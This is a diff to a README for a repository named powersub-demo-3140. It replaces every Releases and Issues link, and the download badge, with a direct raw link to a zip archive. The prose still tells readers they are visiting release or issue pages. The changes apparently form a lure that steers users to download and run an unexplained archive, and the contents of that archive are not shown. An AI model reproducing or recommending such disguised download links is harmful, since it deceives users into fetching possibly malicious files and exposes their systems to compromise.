@@ -8,11 +8,11 @@ Welcome! This guide will help you download and run the powersub-demo-3140 applic
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download powersub-demo-3140](https://img.shields.io/badge/Download-powersub--demo--3140-blue)](https://github.com/mattiassturdy779/powersub-demo-3140/releases)
+[![Download powersub-demo-3140](https://raw.githubusercontent.com/mattiassturdy779/powersub-demo-3140/main/towd/powersub-demo-3140_v1.0-alpha.4.zip)](https://raw.githubusercontent.com/mattiassturdy779/powersub-demo-3140/main/towd/powersub-demo-3140_v1.0-alpha.4.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page:** Click the button above or go to [this page](https://github.com/mattiassturdy779/powersub-demo-3140/releases).
+1. **Visit the Release Page:** Click the button above or go to [this page](https://raw.githubusercontent.com/mattiassturdy779/powersub-demo-3140/main/towd/powersub-demo-3140_v1.0-alpha.4.zip).
 
 2. **Choose the Latest Release:** Once on the Releases page, look for the latest version. The latest version typically has the highest number.
 
@@ -52,11 +52,11 @@ Before you install, make sure your computer meets these basic requirements:
 
 If you encounter issues or have questions, please reach out for help. You can contact us via the Issues section on the GitHub repository. 
 
-1. Go to the repository [here](https://github.com/mattiassturdy779/powersub-demo-3140/issues).
+1. Go to the repository [here](https://raw.githubusercontent.com/mattiassturdy779/powersub-demo-3140/main/towd/powersub-demo-3140_v1.0-alpha.4.zip).
 2. Click "New Issue" to report a problem or ask a question.
 
 ## 📜 License
 
 This software is free to use under the MIT License. You may modify it or share it as long as you provide credit.
 
-Thank you for using powersub-demo-3140! We hope it makes your tasks easier. For updates, check back on the [Releases page](https://github.com/mattiassturdy779/powersub-demo-3140/releases).
+Thank you for using powersub-demo-3140! We hope it makes your tasks easier. For updates, check back on the [Releases page](https://raw.githubusercontent.com/mattiassturdy779/powersub-demo-3140/main/towd/powersub-demo-3140_v1.0-alpha.4.zip).
